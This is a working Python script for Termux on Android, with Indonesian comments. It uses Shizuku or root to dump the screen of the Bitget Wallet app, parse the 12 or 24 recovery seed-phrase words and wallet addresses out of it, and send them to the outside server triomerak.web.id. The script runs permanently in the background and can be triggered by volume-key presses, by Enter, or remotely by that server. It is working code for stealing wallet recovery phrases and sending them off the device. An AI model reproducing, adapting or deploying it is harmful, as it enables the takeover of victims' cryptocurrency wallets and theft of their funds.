#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==================================================================
        TRIO MERAK - SHIZUKU BRIDGE FOR TERMUX (ANDROID)
==================================================================
Jembatan otomatisasi Shizuku (rish) di HP Android untuk:
1. Mengekstrak 12/24 kata Seed Phrase dari layar Bitget Wallet.
2. Mendeteksi Alamat Barcode Penerima (0x...) dari layar Bitget Wallet.
3. Mengirimkan hasil ke Web Server Gateway secara aman lewat internet seluler.

Fitur Otomatisasi:
- Tombol Fisik [VOLUME ATAS] / [VOLUME BAWAH] di HP (Timer 3 detik).
- Tombol [ENTER] di terminal Termux (Timer 3 detik).
- Eksekusi Instan dari tombol Web POS Kasir (Tanpa timer / 0 detik).
- Berjalan 24/7 di latar belakang via PM2 Process Manager.
"""

import os
import sys
import time
import json
import re
import threading
import urllib.request
import urllib.error
import subprocess
import xml.etree.ElementTree as ET

CONFIG_FILE = os.path.expanduser("~/.merak_bridge_config.json")
TRIGGER_FILE = os.path.expanduser("~/.bridge_trigger")

def load_saved_server():
    default_url = "https://triomerak.web.id"
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                url = json.load(f).get("server_url", default_url)
                if "triomerak.web.id" in url:
                    url = "https://triomerak.web.id"
                if not url.startswith("http"):
                    url = "https://" + url
                return url
        except Exception:
            pass
    return default_url

def save_server(url):
    try:
        if "triomerak.web.id" in url:
            url = "https://triomerak.web.id"
        if not url.startswith("http"):
            url = "https://" + url
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"server_url": url.rstrip("/")}, f)
    except Exception:
        pass

_CACHED_RISH = None

def get_rish_cmd():
    global _CACHED_RISH
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"

    if _CACHED_RISH:
        try:
            cmd = (_CACHED_RISH + ["-c", "id"]) if _CACHED_RISH[0] != "su" else ["su", "-c", "id"]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=5, env=env)
            if "uid=" in (res.stdout or ""):
                return _CACHED_RISH
        except Exception:
            _CACHED_RISH = None

    candidates = [
        ["/data/data/com.termux/files/usr/bin/rish"],
        ["rish"],
        ["su", "-c"]
    ]
    for c in candidates:
        try:
            cmd = (c + ["-c", "id"]) if c[0] != "su" else ["su", "-c", "id"]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=8, env=env)
            if "uid=" in (res.stdout or ""):
                _CACHED_RISH = c
                return c
        except Exception:
            pass
    return None

def exec_shizuku_cmd(cmd_str, timeout=15):
    rish = get_rish_cmd()
    if not rish:
        return ""
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"
    try:
        if rish[0] == "su":
            full_cmd = ["su", "-c", cmd_str]
        else:
            full_cmd = rish + ["-c", cmd_str]
        res = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout, env=env)
        return (res.stdout or "").strip()
    except Exception:
        return ""

def dump_ui_xml():
    # Gunakan /data/local/tmp/dump.xml agar bebas dari pembatasan Android Scoped Storage
    exec_shizuku_cmd("uiautomator dump /data/local/tmp/dump.xml")
    xml_data = exec_shizuku_cmd("cat /data/local/tmp/dump.xml")
    if not xml_data or "<hierarchy" not in xml_data:
        # Fallback ke /sdcard/dump.xml jika /data/local/tmp tidak dapat dibaca
        exec_shizuku_cmd("uiautomator dump /sdcard/dump.xml")
        xml_data = exec_shizuku_cmd("cat /sdcard/dump.xml")
    return xml_data

def parse_seed_phrase_from_xml(xml_text):
    if not xml_text or "<hierarchy" not in xml_text:
        return []

    try:
        root = ET.fromstring(xml_text)
    except Exception:
        return []

    raw_nodes = []
    for node in root.iter('node'):
        t = (node.get('text') or '').strip()
        cd = (node.get('content-desc') or '').strip()
        if t:
            raw_nodes.append(t)
        elif cd:
            raw_nodes.append(cd)

    words = []
    for item in raw_nodes:
        lines = [x.strip() for x in item.splitlines() if x.strip()]
        if len(lines) == 2 and lines[0].isdigit() and lines[1].isalpha():
            words.append(lines[1].lower())
        elif len(lines) == 1:
            parts = lines[0].split()
            if len(parts) == 2 and parts[0].replace('.', '').isdigit() and parts[1].isalpha():
                words.append(parts[1].lower())

    if len(words) not in (12, 24):
        ignore = {
            "cadangkan", "tuliskan", "sembunyikan", "teruskan", "batal",
            "lanjut", "kembali", "opsi", "setelan", "tentang", "wallet",
            "phrase", "seed", "backup", "copy", "salin", "lanjutkan",
            "ok", "done", "next", "confirm", "konfirmasi", "view", "show"
        }
        cand = []
        for item in raw_nodes:
            clean = item.strip().lower()
            if clean.isalpha() and 2 <= len(clean) <= 12 and clean not in ignore:
                cand.append(clean)
        if len(cand) in (12, 24):
            words = cand

    return words

def parse_address_from_xml(xml_text):
    if not xml_text:
        return None
    matches = re.findall(r"0x[a-fA-F0-9]{40}", xml_text)
    return matches[0] if matches else None

def send_to_server(server_url, data_type, value, max_retries=10):
    endpoint = server_url.rstrip("/") + "/api/bridge/report"
    payload = json.dumps({
        "type": data_type,
        "value": value,
        "agent": "Termux-Shizuku"
    }).encode("utf-8")

    req = urllib.request.Request(
        endpoint,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "TrioMerakBridge/1.0"}
    )

    print(f"[*] Mengirim {data_type} ke server: {endpoint}...", flush=True)
    for attempt in range(1, max_retries + 1):
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status == 200:
                    resp_json = json.loads(resp.read().decode("utf-8"))
                    print(f"✅ [SUKSES] Berhasil diterima Server! ({resp_json.get('time', '')})", flush=True)
                    return True
        except Exception as e:
            print(f"[-] Percobaan {attempt}/{max_retries} tertunda (Menunggu data seluler aktif): {e}", flush=True)
            time.sleep(2)
    print("❌ [GAGAL] Tidak dapat menghubungi server setelah beberapa kali percobaan.", flush=True)
    return False

# ==============================================================================
# EKSEKUSI EXTRACTION & TIMERS
# ==============================================================================
_extract_lock = threading.Lock()
_is_extracting = False

def do_extract(server_url, with_timer=False, trigger_source=""):
    """
    Eksekusi ekstraksi layar HP.
    Jika with_timer=True (dipicu dari tombol Termux / Volume HP): delay 3 detik.
    Jika with_timer=False (dipicu dari tombol Web POS Kasir): TANPA delay.
    """
    global _is_extracting

    with _extract_lock:
        if _is_extracting:
            print("[!] Sedang proses ekstraksi sebelumnya, abaikan trigger ganda.", flush=True)
            return
        _is_extracting = True

    try:
        if with_timer:
            print("\n" + "=" * 60, flush=True)
            print(f"⚡ [TRIGGER: {trigger_source}]", flush=True)
            print("⏳ Menghitung mundur 3 detik... Buka layar 12 kata di Bitget!", flush=True)
            print("=" * 60, flush=True)
            for sec in (3, 2, 1):
                print(f"👉 Eksekusi dalam {sec} detik...", flush=True)
                time.sleep(1)
            print("🚀 [MEMBACA LAYAR HP SEKARANG]...", flush=True)
        else:
            print(f"\n🚀 [PERINTAH DARI WEB POS: {trigger_source}] Mengekstrak layar instan (Tanpa timer)...", flush=True)

        xml_data = dump_ui_xml()
        words = parse_seed_phrase_from_xml(xml_data)

        if len(words) in (12, 24):
            phrase = " ".join(words)
            print(f"✅ Ditemukan {len(words)} kata Seed Phrase:", flush=True)
            print(f"🔑 {phrase}", flush=True)
            send_to_server(server_url, "phrase", phrase)
            print("🎉 Dompet otomatis terhubung di Web POS Kasir!", flush=True)
        else:
            # Cek apakah sedang membuka barcode penerima
            addr = parse_address_from_xml(xml_data)
            if addr:
                print(f"✅ Alamat Barcode Penerima Terdeteksi:", flush=True)
                print(f"📱 {addr}", flush=True)
                send_to_server(server_url, "address", addr)
                print("🎉 Alamat penerima berhasil dikirim ke Web POS!", flush=True)
            else:
                print(f"❌ Tidak ditemukan 12 kata atau alamat barcode di layar.", flush=True)
                print("   Pastikan layar HP menyala dan membuka halaman 12 kata Seed Phrase Bitget!", flush=True)

        print("\n" + "─" * 60, flush=True)
        print("✨ SIAP UNTUK AKUN BERIKUTNYA!", flush=True)
        print("   Tekan [ENTER] di Termux atau tombol [VOLUME UP / DOWN] di HP.", flush=True)
        print("─" * 60, flush=True)

    except Exception as err:
        print(f"❌ Error ekstraksi: {err}", flush=True)
    finally:
        with _extract_lock:
            _is_extracting = False

# ==============================================================================
# BACKGROUND LISTENERS: VOLUME KEYS, FILE TRIGGER (ENTER), & WEB POLL
# ==============================================================================
def listen_volume_keys(server_url):
    """Mendengarkan event tombol fisik Volume Up & Volume Down di HP via getevent."""
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"

    while True:
        rish = get_rish_cmd()
        if not rish:
            time.sleep(3)
            continue

        cmd = (rish + ["-c", "getevent -l"]) if rish[0] != "su" else ["su", "-c", "getevent -l"]

        try:
            # Gunakan PTY jika tersedia di Termux agar getevent tidak menahan output dalam buffer C 4KB
            try:
                import pty
                master, slave = pty.openpty()
                proc = subprocess.Popen(
                    cmd,
                    stdin=slave,
                    stdout=slave,
                    stderr=slave,
                    env=env,
                    close_fds=True
                )
                os.close(slave)
                out_stream = open(master, "r", encoding="utf-8", errors="ignore")
            except Exception:
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    bufsize=1,
                    env=env
                )
                out_stream = proc.stdout

            print("🎧 Listener tombol fisik Volume HP aktif & siap!", flush=True)

            for line in out_stream:
                if not line:
                    break
                line_up = line.upper()
                if "KEY_VOLUMEUP" in line_up or "KEY_VOLUMEDOWN" in line_up or " 0072 " in line or " 0073 " in line:
                    if "DOWN" in line_up or " 00000001" in line:
                        btn_name = "VOLUME ATAS" if ("UP" in line_up or " 0073 " in line) else "VOLUME BAWAH"
                        print(f"\n👉 [TOMBOL FISIK HP TERDETEKSI: {btn_name}]", flush=True)
                        threading.Thread(target=do_extract, args=(server_url, True, btn_name), daemon=True).start()

        except Exception:
            time.sleep(2)

def listen_file_trigger(server_url):
    """Mendengarkan trigger file ~/.bridge_trigger (dipicu saat tombol ENTER ditekan di Termux)."""
    while True:
        try:
            if os.path.exists(TRIGGER_FILE):
                try:
                    os.remove(TRIGGER_FILE)
                except Exception:
                    pass
                print("\n👉 [TOMBOL ENTER TERMUX TERDETEKSI]", flush=True)
                threading.Thread(target=do_extract, args=(server_url, True, "ENTER TERMUX"), daemon=True).start()
        except Exception:
            pass
        time.sleep(0.4)

def listen_stdin_enter(server_url):
    """Mendengarkan penekanan tombol ENTER di terminal jika berjalan di foreground."""
    while True:
        try:
            line = sys.stdin.readline()
            if not line:
                time.sleep(1)
                continue
            threading.Thread(target=do_extract, args=(server_url, True, "TOMBOL ENTER"), daemon=True).start()
        except Exception:
            time.sleep(1)

def listen_web_poll(server_url):
    """Mendengarkan klik tombol dari halaman Web POS Kasir (Tanpa Timer)."""
    poll_endpoint = server_url.rstrip("/") + "/api/bridge/poll"
    while True:
        try:
            req = urllib.request.Request(
                poll_endpoint,
                headers={"User-Agent": "TrioMerakBridge/1.0"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                cmd = data.get("command")
                if cmd in ("EXTRACT_PHRASE", "DETECT_ADDRESS"):
                    threading.Thread(target=do_extract, args=(server_url, False, f"KLIK WEB POS ({cmd})"), daemon=True).start()
        except Exception:
            pass
        time.sleep(1)

def main():
    server_url = load_saved_server()
    if "--server" in sys.argv:
        idx = sys.argv.index("--server")
        if idx + 1 < len(sys.argv):
            server_url = sys.argv[idx + 1]
            if not server_url.startswith("http"):
                server_url = "https://" + server_url
            save_server(server_url)

    if "--trigger" in sys.argv or "--extract" in sys.argv:
        try:
            with open(TRIGGER_FILE, "w") as f:
                f.write("1")
            print("✅ Trigger ekstraksi berhasil dikirim ke background bridge!")
        except Exception as e:
            print(f"❌ Gagal mengirim trigger: {e}")
        return

    rish = get_rish_cmd()

    print("=" * 60, flush=True)
    print("   TRIO MERAK - SHIZUKU BRIDGE RUNNER FOR TERMUX", flush=True)
    print("=" * 60, flush=True)
    if rish:
        print(f"✅ Akses Shizuku / Root Aktif : {' '.join(rish)}", flush=True)
    else:
        print("⚠️ Akses rish / Shizuku belum aktif di Termux!", flush=True)
        print("   💡 Panduan Cepat:", flush=True)
        print("   1. Buka aplikasi Shizuku di HP -> Pastikan 'Shizuku is running'", flush=True)
        print("   2. Buka menu 'Authorized applications' (Aplikasi yang diizinkan) -> Centang Termux", flush=True)
        print("   3. Jalankan perintah di Termux:", flush=True)
        print("      cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/ && chmod +x $PREFIX/bin/rish", flush=True)
    print(f"🌐 Server Target Web Gateway : {server_url}", flush=True)
    print("=" * 60, flush=True)
    print("⚡ SHORTCUT EKSTRAKSI CEPAT:", flush=True)
    print("  👉 Tekan Tombol [VOLUME ATAS / BAWAH] di HP (Timer 3s)", flush=True)
    print("  👉 Tekan [ENTER] di Termux (Timer 3s)", flush=True)
    print("  👉 Klik [Ambil Phrase] di Web POS Kasir (Instan)", flush=True)
    print("  👉 Tekan Ctrl + C untuk keluar dari log", flush=True)
    print("=" * 60, flush=True)
    print("🟢 Bridge aktif & standby 24/7 di background (PM2)...\n", flush=True)

    # Jalankan listener di thread terpisah
    threading.Thread(target=listen_volume_keys, args=(server_url,), daemon=True).start()
    threading.Thread(target=listen_web_poll, args=(server_url,), daemon=True).start()
    threading.Thread(target=listen_file_trigger, args=(server_url,), daemon=True).start()

    # Jika berjalan di foreground dengan TTY, pasang juga listener stdin
    if sys.stdin and sys.stdin.isatty():
        try:
            listen_stdin_enter(server_url)
        except KeyboardInterrupt:
            print("\n\n[*] Bridge dihentikan oleh pengguna. Sampai jumpa!")
            return

    # Loop utama background process
    try:
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
